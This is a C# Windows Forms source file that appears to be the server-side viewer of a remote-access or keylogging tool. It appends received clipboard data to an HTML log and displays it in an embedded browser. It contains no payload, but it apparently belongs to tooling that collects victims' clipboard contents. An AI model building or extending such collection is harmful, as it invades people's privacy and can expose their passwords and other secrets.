using CefSharp;
using server.Others;
using System;
using System.IO;
using System.Windows.Forms;

namespace server
{
    public partial class frm_clipboard : Form
    {
        public frm_clipboard()
        {
            InitializeComponent();
        }
        public string clipfile = Classes.Common.current_path + @"Clipboard logs.html";
        public void LoadAll()
        {
            if (!File.Exists(clipfile))
            {
                StreamWriter strm = new StreamWriter(clipfile);
                strm.Write(Properties.Resources.html_clip_key);
                strm.Close();
            }
            string curent_clip = Shared_data.clip_data;

            string saved_clip = File.ReadAllText(clipfile);
            if (!saved_clip.Contains(curent_clip))
            {
                Clipboard.SetText(clipfile);
                File.AppendAllText(clipfile, Environment.NewLine + Others.Shared_data.clip_data);

            }
            chromiumWebBrowser1.LoadHtml(saved_clip);


            Shared_data.clip_isready = false;
        }
        private void frm_clipboard_Load(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (Shared_data.clip_isready == true)
            {
                LoadAll();
                timer1.Stop();

            }
        }

        private void flatButton1_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
